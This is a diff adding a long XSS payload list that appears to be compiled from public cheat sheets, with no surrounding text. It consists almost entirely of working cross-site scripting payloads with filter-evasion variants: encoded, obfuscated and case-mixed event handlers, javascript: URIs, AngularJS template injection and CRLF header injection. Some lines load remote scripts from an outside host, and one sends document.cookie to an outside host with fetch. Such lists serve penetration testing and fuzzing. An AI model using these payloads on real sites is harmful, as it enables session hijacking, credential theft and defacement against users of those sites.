@@ -1,0 +1,356 @@
+test<iframe></textarea></iframe><iframe srcdoc="<img src onerror=alert(1)>">a
+redirect_url=javscript:alert(1)
+<samp><script><section><img onerror="alert()" src />
+/javascript:alert%25281%2529/.source; :>
+<samp><script><section><img onerror="self['ale'+'rt']()" src />
+<section><img onerror="self['ale'+'rt']()" src />
+alert?.(document?.cookie)
+java\nscript:alert(1)
+\0x1javascript:alert(1)
+jaVAscrIpt:alert(1)
+onerror="self['ale'+'rt']()"
+%u003c%u002fscript%u003ewhs%u003cScRIPt%u0020a%u003ealert(document%20.%20cookie)%u003c%u002fScRiPt%u003e
+document%20.%20cookie
+%u003c%u002fscript%u003ewhs%u003cScRIPt%u0020a%u003ewindow["document"]["cookie"])%u003c%u002fScRiPt%u003e
+window["document"]["cookie"]
+window["alert"](window["document"]["cookie"]);
+document/*foo*/./*bar*/cookie
+window[%22alert%22](window[%22document%22][%22cookie%22]);
+self["alert"]("foo");
+self["$"]["globalEval"]("alert(1)");
+self["\x24"]
+["\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"]
+("\x61\x6c\x65\x72\x74\x28\x31\x29");
+self[Object.keys(self)[5]]("foo")
+self["ale"+"rt"](self["doc"+"ument"]["coo"+"kie"])
+<sg onload="alert(1)" <=""svg=""
+test+onfouus='alert(0)'id='xss'
+"><img src onerror=alert(1)>
+«input»;p=\&q=-alert(1)//$result*var n = {a: "\", b: "-alert(1)}//"};
+Function`alert\`xss\````
+«input»;p=-alert(1)}//\$result*var n = {a: "-alert(1)}//\", b: "-alert(1)}//\"};
+"'`()[]\%; 
+<x/oncopy=alert()>x
+<svg id=javascript:alert(10) onload=location=id>
+"autofocus onfocus=alert(1)//
+</script><script>alert(1)</script>
+<link href=javascript:alert(1) accesskey=k> 
+<iframe src="javascript:alert(1)%%0D3C--
+<svg><script xlink:href=data:,alert(1)>
+<img src='//yourserver/?sourceData=
+-confirm`1`-”
+<</div>script</div>>alert()<</div>/script</div>>
+\”-confirm`1`//
+<x/oncopy=alert()>x
+<script>alert(1)//
+<script>alert(1)<!--
+<script>alert(1)%0A-->
+<script src=data:,alert(1)>
+<script src=//HOST/FILE>
+<script src=https:DOMAIN/FILE>
+<svg><script xlink:href=//HOST/FILE>
+<svg><script xlink:href=https:DOMAIN/FILE>
+?url="onm<>ouseover="ale<>rt(1)
+" accesskey='x' onclick='confirm`1`' //
+<svg onload="import('data:text/javascript,al'+''+'ert(0)')">
+<svg id=javascript:alert(10) onload=location=id>
+<a href="jav%0Dascript&colon;alert(1)">
+<a href=javascript&colon;confirm(1)>
+<a href=&#01javascript:alert(1)>
+param A=<script>alert("
+param B=")</script>
+<tag handler=code>
+\”}})})-confirm`1`//
+\”}})})-confirm`1`/*/
+\”}})})-confirm`1`;/*///
+*/alert(1)</script><script>/*
+\”}})})-confirm`1`;{/*///
+\”}})})-confirm`1`;({{/*///
+\”}})})-confirm`1`;({if(){/*///
+\”}})})-confirm`1`;({({if(){/*///
+\”}})})-confirm`1`;(function(){({if(){/*///
+testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'
+\”}})})-confirm`1`(a=>{({b:{/*///
+<?=json_encode(getallheaders()).”\n”;
+<svg onload=write(1)>
+‘onload=alert(1)><svg/1=’
+p=*/alert(1)”>’onload=”/*<svg/1=’
+p=`-alert(1)”>’onload=”`<svg/1=’
+<link rel=import href='.&#47"><svg%20onload=alert(domain)>'>
+</</script>script> <</svg>svg/onload=prompt`${document.cookie}`>
+<embed /: script allowscriptaccess = always src = javascript:alert(document.cookie); http://l0.cm/xss.swf>
+</script><svg><script>alert(1)%0A-->
+["</script><script>alert(1)</script>"]=123
+<script src=//3334957647/1>
+javascript&#58alert(document.domain)
+javascript&#x3ax=1;alert(document.domain)
+<embed src="javascript%26%63%6f%6c%6f%6e%3balert()">
+http://top.open`javas\cript:al\ert(1)`
+<script>alert(1)//
+<script>alert(1)<!--
+<script>alert(1)%0A-->
+<script src=data:,alert(1)>
+<script src=//HOST/FILE>
+<script src=https:DOMAIN/FILE>
+<svg><script xlink:href=//HOST/FILE>
+<svg><script xlink:href=https:DOMAIN/FILE>
+{alert`1`}
+(except <script>)
+"><input/onauxclick="[1].map(prompt)">
+"`/alert(1)</script><script>`
+'-alert(1)-'
+\'-alert(1)//
+javascript:alert(1)
+<svg 1=""onload=alert(1)>
+"><svg/onload=confirm(1)>"@x.y
+<svg onload=alert(1)>
+"><svg onload=alert(1)//
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+</script><svg onload=alert(1)>
+<x contenteditable onblur=alert(1)>lose focus! 
+<x onclick=alert(1)>click this! 
+<x oncopy=alert(1)>copy this! 
+<x oncontextmenu=alert(1)>right click this! 
+<x oncut=alert(1)>copy this! 
+<x ondblclick=alert(1)>double click this! 
+<x ondrag=alert(1)>drag this! 
+<x contenteditable onfocus=alert(1)>focus this! 
+<x contenteditable oninput=alert(1)>input here! 
+<x contenteditable onkeydown=alert(1)>press any key! 
+<x contenteditable onkeypress=alert(1)>press any key! 
+<x contenteditable onkeyup=alert(1)>press any key! 
+<x onmousedown=alert(1)>click this! 
+<x onmousemove=alert(1)>hover this! 
+<x onmouseout=alert(1)>hover this! 
+<x onmouseover=alert(1)>hover this! 
+<x onmouseup=alert(1)>click this! 
+<x contenteditable onpaste=alert(1)>paste here!
+<script>alert(1)// 
+<script>alert(1)<!–
+<script src=//brutelogic.com.br/1.js> 
+<script src=//3334957647/1>
+%3Cx onxxx=alert(1) 
+<%78 onxxx=1 
+<x %6Fnxxx=1 
+<x o%6Exxx=1 
+<x on%78xx=1 
+<x onxxx%3D1
+<X onxxx=1 
+<x OnXxx=1 
+<X OnXxx=1 
+<x onxxx=1 onxxx=1
+<x/onxxx=1 
+<x%09onxxx=1 
+<x%0Aonxxx=1 
+<x%0Conxxx=1 
+<x%0Donxxx=1 
+<x%2Fonxxx=1 
+<x 1='1'onxxx=1 
+<x 1="1"onxxx=1
+<x </onxxx=1 
+<x 1=">" onxxx=1 
+<http://onxxx%3D1/
+<x onxxx=alert(1) 1='
+<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>
+'onload=alert(1)><svg/1='
+'>alert(1)</script><script/1=' 
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1='
+`-alert(1)">'onload="`<svg/1='
+*/</script>'>alert(1)/*<script/1='
+<script>alert(1)</script> 
+<script src=javascript:alert(1)> 
+<iframe src=javascript:alert(1)> 
+<embed src=javascript:alert(1)> 
+<a href=javascript:alert(1)>click 
+<math><brute href=javascript:alert(1)>click 
+<form action=javascript:alert(1)><input type=submit> 
+<isindex action=javascript:alert(1) type=submit value=click> 
+<form><button formaction=javascript:alert(1)>click 
+<form><input formaction=javascript:alert(1) type=submit value=click> 
+<form><input formaction=javascript:alert(1) type=image value=click> 
+<form><input formaction=javascript:alert(1) type=image src=SOURCE> 
+<isindex formaction=javascript:alert(1) type=submit value=click> 
+<object data=javascript:alert(1)> 
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> 
+<svg><script xlink:href=data:,alert(1) /> 
+<math><brute xlink:href=javascript:alert(1)>click 
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
+<html ontouchstart=alert(1)> 
+<html ontouchend=alert(1)> 
+<html ontouchmove=alert(1)> 
+<html ontouchcancel=alert(1)>
+<body onorientationchange=alert(1)>
+"><img src=1 onerror=alert(1)>.gif
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+<script src="data:&comma;alert(1)//
+"><script src=data:&comma;alert(1)//
+<script src="//brutelogic.com.br&sol;1.js&num; 
+"><script src=//brutelogic.com.br&sol;1.js&num; 
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+<base href=//0>
+<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=#x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body onscroll=alert(1)><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><x id=x>#x
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1! (MSIE)
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+<svg onload=alert(1)> "><svg onload=alert(1)>
+"><svg onload=alert(1)>
+</tag><svg onload=alert(1)>
+"></tag><svg onload=alert(1)>
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+javascript:alert(1)
+data:text/html,<svg onload=alert(1)>
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+'}alert(1);{'
+'}alert(1)%0A{'
+\'}alert(1);{//
+</script><svg onload=alert(1)>
+'onload=alert(1)><svg/1=' 
+'>alert(1)</script><script/1=' 
+*/alert(1)</script><script>/*
+*/alert(1)">'onload="/*<svg/1=' 
+`-alert(1)">'onload="`<svg/1=' 
+*/</script>'>alert(1)/*<script/1='
+p=<svg/1='&q='onload=alert(1)>
+p=<svg 1='&q='onload='/*&r=*/alert(1)'>
+"><svg onload=alert(1)>.gif
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+<img src=1 onerror=alert(1)> 
+<iframe src=javascript:alert(1)>
+data:text/html,<img src=1 onerror=alert(1)> 
+data:text/html,<iframe src=javascript:alert(1)>
+"><svg onload=alert(1)>?a=reader
+<script src=data:,alert(1)>
+<script src=//brutelogic.com.br/1.js>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
+<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//brutelogic.com.br/1.js"/>
+{{32*32}}
+{{constructor.constructor('alert(1)')()}}
+<x ng-app>{{constructor.constructor('alert(1)')()}}
+%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0A%0D%0A %3Cscript%3Ealert(1)%3C/script%3E
+%0D%0ALocation:%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection %3a0%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C/script%3E
+<Svg OnLoad=alert(1)> 
+<Script>alert(1)</Script>
+<svg onload=alert(1)// 
+<svg onload="alert(1)"
+<SVG ONLOAD=&#97&#108&#101&#114&#116(1)> 
+<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
+<script/x>alert(1)</script>
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E 
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+alert`1`
+setInterval`alert\x28document.domain\x29` 
+setTimeout`alert\x28document.domain\x29`
+<svg onload=alert&lpar;1&rpar;> 
+<svg onload=alert&#40;1&#41>
+[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] 
+('\141\154\145\162\164\50\61\51')()
+(alert)(1)
+a=alert,a(1)
+[1].find(alert) 
+top["al"+"ert"](1) 
+top[/al/.source+/ert/.source](1) 
+al\u0065rt(1)
+top['al\145rt'](1) 
+top[8680439..toString(30)](1)
+GIF89a=//<script> 
+alert(1)//</script>;
+eval(URL.slice(-8)) #alert(1)
+eval(location.hash.slice(1)) #alert(1) document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
+<svg/onload=innerHTML=location.hash> #<img/src/onerror=alert(1)>
+"o<x>nmouseover=alert<x>(1)// "autof<x>ocus o<x>nfocus=alert<x>(1)//
+&lt;svg/onload&equals;alert(1)&gt;
+target=//brutelogic.com.br/tests/status.html&msg=<script>alert(1)</script>
+<script src=https://www.google.com/complete/search?client=chrome %26jsonp=alert(1);></script>
+<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js> </script><x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}
+<script>alert(1)</script>
+<script src=data:,alert(1)>
+<iframe src=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>click
+<math><brute href=javascript:alert(1)>click
+<form action=javascript:alert(1)><input type=submit>
+<isindex action=javascript:alert(1) type=submit value=click> <form><button formaction=javascript:alert(1)>click
+<form><input formaction=javascript:alert(1) type=submit value=click> <form><input formaction=javascript:alert(1) type=image value=click> <form><input formaction=javascript:alert(1) type=image src=SOURCE> <isindex formaction=javascript:alert(1) type=submit value=click> <object data=javascript:alert(1)>
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> <svg><script xlink:href=data:,alert(1) />
+<math><brute xlink:href=javascript:alert(1)>click
+<x contenteditable onblur=alert(1)>lose focus! <x onclick=alert(1)>click this!
+<x oncopy=alert(1)>copy this!
+<x oncontextmenu=alert(1)>right click this! <x oncut=alert(1)>copy this!
+<x ondblclick=alert(1)>double click this!
+<x ondrag=alert(1)>drag this!
+<x contenteditable onfocus=alert(1)>focus this!
+<x contenteditable oninput=alert(1)>input here!
+<x contenteditable onkeydown=alert(1)>press any key! <x contenteditable onkeypress=alert(1)>press any key! <x contenteditable onkeyup=alert(1)>press any key! <x onmousedown=alert(1)>click this!
+<x onmousemove=alert(1)>hover this!
+<x onmouseout=alert(1)>hover this!
+<x onmouseover=alert(1)>hover this!
+<x onmouseup=alert(1)>click this!
+<x contenteditable onpaste=alert(1)>paste here!
+<!-- 
+%0A—>
+<iframe src="//brutelogic.com.br/xss.php?a=<svg onload=alert(document.domain)>" style=display:none></iframe>
+fetch('//brutelogic.com.br/?c='+document.cookie)
+<svg onload="documentElement.innerHTML='<h1>Not Found</h1>'">
+'"</Script><Html /Onmouseover=(alert)(1) //
+onload=function(){$.getScript('//brutelogic.com.br/2.js')}
+onload=x=>$.getScript('//brutelogic.com.br/2.js')
+<img src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= onload=alert(1)>
+<base href=//knoxss.me>
+<html ontouchstart=alert(1)>
+<html ontouchend=alert(1)>
+<html ontouchmove=alert(1)>
+<body onorientationchange=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=%23x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br> <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br> <br><x id=x>#x
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1!
+<marquee onstart=alert(1)>
+<marquee loop=1 width=0 onfinish=alert(1)>
+<audio src onloadstart=alert(1)>
+<video onloadstart=alert(1)><source>
+<input autofocus onblur=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<select onchange=alert(1)><option>1<option>2
+<menu id=x contextmenu=x onshow=alert(1)>right click me!
+}]};(confirm)()//\
+<A%0aONMouseOvER%0d=%0d[8].find(confirm)>z
+</tiTlE/><a%0donpOintErentER%0d=%0d(prompt)``>z
+</SCRiPT/><DETAILs/+/onpoINTERenTEr%0a=%0aa=prompt,a()//
+<a href="javas%09cript:[1].map(top['ale'+'rt'])">
+[][“\146\151\154\164\145\162”][“\143\157\156\163\164\162\165\143\164\157\162”](“\145\166\141\154\50\141\164\157\142\50\42\131\127\170\154\143\156\121\157\115\123\153\75\42\51\51”)()
+a=”al”;b=”ert”;self[a+b]();
+a=”Fun”;b=”ction”;c=”ev”;d=”al(a”;e=”tob”;f=”(‘YWxlcnQoMSk=’))”;self[a+b](c+d+e+f)();
+;a=”ev”;b=”al”;c=”(a”;d=”tob(‘“;e=”YWxlcnQoMSk=’))”;[a+b+c+d+e].map(setTimeout)
+{alert('document.cookie')}
